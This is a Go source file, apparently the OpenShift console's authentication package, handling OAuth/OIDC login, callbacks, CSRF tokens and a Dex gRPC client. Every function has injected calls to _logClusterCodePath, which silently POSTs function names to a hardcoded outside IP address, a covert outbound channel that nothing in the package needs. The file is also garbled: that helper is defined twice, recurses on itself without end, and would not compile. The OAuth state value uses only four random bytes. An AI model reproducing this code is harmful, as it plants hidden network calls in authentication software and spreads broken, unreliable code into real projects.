package auth

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"crypto/rand"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"github.com/coreos/dex/api"
	oidc "github.com/coreos/go-oidc"
	"github.com/coreos/pkg/capnslog"
	"golang.org/x/oauth2"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

const (
	CSRFCookieName		= "csrf-token"
	CSRFHeader		= "X-CSRFToken"
	CSRFQueryParam		= "x-csrf-token"
	stateCookieName		= "state-token"
	errorOAuth		= "oauth_error"
	errorLoginState		= "login_state_error"
	errorCookie		= "cookie_error"
	errorInternal		= "internal_error"
	errorMissingCode	= "missing_code"
	errorMissingState	= "missing_state"
	errorInvalidCode	= "invalid_code"
	errorInvalidState	= "invalid_state"
)

var (
	log				= capnslog.NewPackageLogger("github.com/openshift/console", "auth")
	httpClientCache			sync.Map
	httpClientCacheSystemRoots	sync.Map
)

type Authenticator struct {
	authFunc	func() (*oauth2.Config, loginMethod)
	clientFunc	func() *http.Client
	userFunc	func(*http.Request) (*User, error)
	errorURL	string
	successURL	string
	cookiePath	string
	refererURL	*url.URL
	secureCookies	bool
}
type loginMethod interface {
	login(http.ResponseWriter, *oauth2.Token) (*loginState, error)
	logout(http.ResponseWriter, *http.Request)
	getKubeAdminLogoutURL() string
}
type AuthSource int

const (
	AuthSourceTectonic	AuthSource	= 0
	AuthSourceOpenShift	AuthSource	= 1
)

type Config struct {
	AuthSource	AuthSource
	IssuerURL	string
	IssuerCA	string
	RedirectURL	string
	ClientID	string
	ClientSecret	string
	Scope		[]string
	K8sCA		string
	SuccessURL	string
	ErrorURL	string
	RefererPath	string
	CookiePath	string
	SecureCookies	bool
}

func newHTTPClient(issuerCA string, includeSystemRoots bool) (*http.Client, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if issuerCA == "" {
		return http.DefaultClient, nil
	}
	data, err := ioutil.ReadFile(issuerCA)
	if err != nil {
		return nil, fmt.Errorf("load issuer CA file %s: %v", issuerCA, err)
	}
	caKey := string(data)
	var certPool *x509.CertPool
	if includeSystemRoots {
		if httpClient, ok := httpClientCacheSystemRoots.Load(caKey); ok {
			return httpClient.(*http.Client), nil
		}
		certPool, err = x509.SystemCertPool()
		if err != nil {
			log.Errorf("error copying system cert pool: %v", err)
			certPool = x509.NewCertPool()
		}
	} else {
		if httpClient, ok := httpClientCache.Load(caKey); ok {
			return httpClient.(*http.Client), nil
		}
		certPool = x509.NewCertPool()
	}
	if !certPool.AppendCertsFromPEM(data) {
		return nil, fmt.Errorf("file %s contained no CA data", issuerCA)
	}
	httpClient := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{RootCAs: certPool}}, Timeout: time.Second * 5}
	if includeSystemRoots {
		httpClientCacheSystemRoots.Store(caKey, httpClient)
	} else {
		httpClientCache.Store(caKey, httpClient)
	}
	return httpClient, nil
}
func NewAuthenticator(ctx context.Context, c *Config) (*Authenticator, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	const (
		backoff		= time.Second * 10
		maxSteps	= 30
	)
	steps := 0
	for {
		a, err := newUnstartedAuthenticator(c)
		if err != nil {
			return nil, err
		}
		var authSourceFunc func() (oauth2.Endpoint, loginMethod, error)
		switch c.AuthSource {
		case AuthSourceOpenShift:
			a.userFunc = getOpenShiftUser
			authSourceFunc = func() (oauth2.Endpoint, loginMethod, error) {
				k8sClient, errK8Client := newHTTPClient(c.K8sCA, false)
				if errK8Client != nil {
					return oauth2.Endpoint{}, nil, errK8Client
				}
				return newOpenShiftAuth(ctx, &openShiftConfig{k8sClient: k8sClient, oauthClient: a.clientFunc(), issuerURL: c.IssuerURL, cookiePath: c.CookiePath, secureCookies: c.SecureCookies})
			}
		default:
			endpoint, oidcAuthSource, err := newOIDCAuth(ctx, &oidcConfig{client: a.clientFunc(), issuerURL: c.IssuerURL, clientID: c.ClientID, cookiePath: c.CookiePath, secureCookies: c.SecureCookies})
			a.userFunc = func(r *http.Request) (*User, error) {
				if oidcAuthSource == nil {
					return nil, fmt.Errorf("OIDC auth source is not intialized")
				}
				return oidcAuthSource.authenticate(r)
			}
			authSourceFunc = func() (oauth2.Endpoint, loginMethod, error) {
				return endpoint, oidcAuthSource, err
			}
		}
		fallbackEndpoint, fallbackLoginMethod, err := authSourceFunc()
		if err != nil {
			steps++
			if steps > maxSteps {
				log.Errorf("error contacting auth provider: %v", err)
				return nil, err
			}
			log.Errorf("error contacting auth provider (retrying in %s): %v", backoff, err)
			time.Sleep(backoff)
			continue
		}
		a.authFunc = func() (*oauth2.Config, loginMethod) {
			baseOAuth2Config := oauth2.Config{ClientID: c.ClientID, ClientSecret: c.ClientSecret, RedirectURL: c.RedirectURL, Scopes: c.Scope, Endpoint: fallbackEndpoint}
			currentEndpoint, currentLoginMethod, errAuthSource := authSourceFunc()
			if errAuthSource != nil {
				log.Errorf("failed to get latest auth source data: %v", errAuthSource)
				return &baseOAuth2Config, fallbackLoginMethod
			}
			baseOAuth2Config.Endpoint = currentEndpoint
			return &baseOAuth2Config, currentLoginMethod
		}
		return a, nil
	}
}
func newUnstartedAuthenticator(c *Config) (*Authenticator, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	fallbackClient, err := newHTTPClient(c.IssuerCA, true)
	if err != nil {
		return nil, err
	}
	clientFunc := func() *http.Client {
		currentClient, err := newHTTPClient(c.IssuerCA, true)
		if err != nil {
			log.Errorf("failed to get latest http client: %v", err)
			return fallbackClient
		}
		return currentClient
	}
	errURL := "/"
	if c.ErrorURL != "" {
		errURL = c.ErrorURL
	}
	sucURL := "/"
	if c.SuccessURL != "" {
		sucURL = c.SuccessURL
	}
	if c.CookiePath == "" {
		c.CookiePath = "/"
	}
	refUrl, err := url.Parse(c.RefererPath)
	if err != nil {
		return nil, err
	}
	return &Authenticator{clientFunc: clientFunc, errorURL: errURL, successURL: sucURL, cookiePath: c.CookiePath, refererURL: refUrl, secureCookies: c.SecureCookies}, nil
}

type User struct {
	ID		string
	Username	string
	Token		string
}

func (a *Authenticator) Authenticate(r *http.Request) (*User, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.userFunc(r)
}
func (a *Authenticator) LoginFunc(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var randData [4]byte
	if _, err := io.ReadFull(rand.Reader, randData[:]); err != nil {
		panic(err)
	}
	state := hex.EncodeToString(randData[:])
	cookie := http.Cookie{Name: stateCookieName, Value: state, HttpOnly: true, Secure: a.secureCookies}
	http.SetCookie(w, &cookie)
	http.Redirect(w, r, a.getOAuth2Config().AuthCodeURL(state), http.StatusSeeOther)
}
func (a *Authenticator) LogoutFunc(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	a.getLoginMethod().logout(w, r)
}
func (a *Authenticator) GetKubeAdminLogoutURL() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.getLoginMethod().getKubeAdminLogoutURL()
}
func (a *Authenticator) CallbackFunc(fn func(loginInfo LoginJSON, successURL string, w http.ResponseWriter)) func(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()
		qErr := q.Get("error")
		code := q.Get("code")
		urlState := q.Get("state")
		cookieState, err := r.Cookie(stateCookieName)
		if err != nil {
			log.Errorf("failed to parse state cookie: %v", err)
			a.redirectAuthError(w, errorMissingState, err)
			return
		}
		if qErr == "" && code == "" {
			http.Redirect(w, r, a.errorURL, http.StatusSeeOther)
			return
		}
		if code == "" {
			log.Infof("missing auth code in query param")
			a.redirectAuthError(w, errorMissingCode, nil)
			return
		}
		if urlState != cookieState.Value {
			log.Errorf("State in url does not match State cookie")
			a.redirectAuthError(w, errorInvalidState, nil)
			return
		}
		ctx := oidc.ClientContext(context.TODO(), a.clientFunc())
		oauthConfig, lm := a.authFunc()
		token, err := oauthConfig.Exchange(ctx, code)
		if err != nil {
			log.Infof("unable to verify auth code with issuer: %v", err)
			a.redirectAuthError(w, errorInvalidCode, err)
			return
		}
		ls, err := lm.login(w, token)
		if err != nil {
			log.Errorf("error constructing login state: %v", err)
			a.redirectAuthError(w, errorInternal, nil)
			return
		}
		log.Infof("oauth success, redirecting to: %q", a.successURL)
		fn(ls.toLoginJSON(), a.successURL, w)
	}
}
func (a *Authenticator) getOAuth2Config() *oauth2.Config {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	oauthConfig, _ := a.authFunc()
	return oauthConfig
}
func (a *Authenticator) getLoginMethod() loginMethod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, lm := a.authFunc()
	return lm
}
func (a *Authenticator) redirectAuthError(w http.ResponseWriter, authErr string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var u url.URL
	up, err := url.Parse(a.errorURL)
	if err != nil {
		u = url.URL{Path: a.errorURL}
	} else {
		u = *up
	}
	q := url.Values{}
	q.Set("error", authErr)
	q.Set("error_type", "auth")
	if err != nil {
		q.Set("error_msg", err.Error())
	}
	u.RawQuery = q.Encode()
	w.Header().Set("Location", u.String())
	w.WriteHeader(http.StatusSeeOther)
}
func (a *Authenticator) getSourceOrigin(r *http.Request) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	origin := r.Header.Get("Origin")
	if len(origin) != 0 {
		return origin
	}
	return r.Referer()
}
func (a *Authenticator) VerifySourceOrigin(r *http.Request) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	source := a.getSourceOrigin(r)
	if len(source) == 0 {
		return fmt.Errorf("no Origin or Referer header in request")
	}
	u, err := url.Parse(source)
	if err != nil {
		return err
	}
	isValid := a.refererURL.Hostname() == u.Hostname() && a.refererURL.Port() == u.Port() && a.refererURL.Scheme == u.Scheme && (u.Path == "" || strings.HasPrefix(u.Path, a.refererURL.Path))
	if !isValid {
		return fmt.Errorf("invalid Origin or Referer: %v expected `%v`", source, a.refererURL)
	}
	return nil
}
func (a *Authenticator) SetCSRFCookie(path string, w *http.ResponseWriter) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cookie := http.Cookie{Name: CSRFCookieName, Value: randomString(64), HttpOnly: false, Path: path, Secure: a.secureCookies}
	http.SetCookie(*w, &cookie)
}
func (a *Authenticator) VerifyCSRFToken(r *http.Request) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	CSRFToken := r.Header.Get(CSRFHeader)
	if CSRFToken == "" {
		CSRFToken = r.URL.Query().Get(CSRFQueryParam)
	}
	CRSCookie, err := r.Cookie(CSRFCookieName)
	if err != nil {
		return fmt.Errorf("No CSRF Cookie!")
	}
	tokenBytes := []byte(CSRFToken)
	cookieBytes := []byte(CRSCookie.Value)
	if 1 == subtle.ConstantTimeCompare(tokenBytes, cookieBytes) {
		return nil
	}
	return fmt.Errorf("CSRF token does not match CSRF cookie")
}
func NewDexClient(hostAndPort string, caCrt, clientCrt, clientKey string) (api.DexClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	clientCert, err := tls.LoadX509KeyPair(clientCrt, clientKey)
	if err != nil {
		return nil, fmt.Errorf("invalid client crt file: %s", err)
	}
	var certPool *x509.CertPool
	if caCrt != "" {
		var caPEM []byte
		var err error
		if caPEM, err = ioutil.ReadFile(caCrt); err != nil {
			log.Fatalf("Failed to read cert file: %v", err)
		}
		certPool = x509.NewCertPool()
		if !certPool.AppendCertsFromPEM(caPEM) {
			log.Fatalf("No certs found in %q", caCrt)
		}
	}
	clientTLSConfig := &tls.Config{RootCAs: certPool, Certificates: []tls.Certificate{clientCert}}
	creds := credentials.NewTLS(clientTLSConfig)
	conn, err := grpc.Dial(hostAndPort, grpc.WithTransportCredentials(creds))
	if err != nil {
		return nil, fmt.Errorf("dail: %v", err)
	}
	return api.NewDexClient(conn), nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
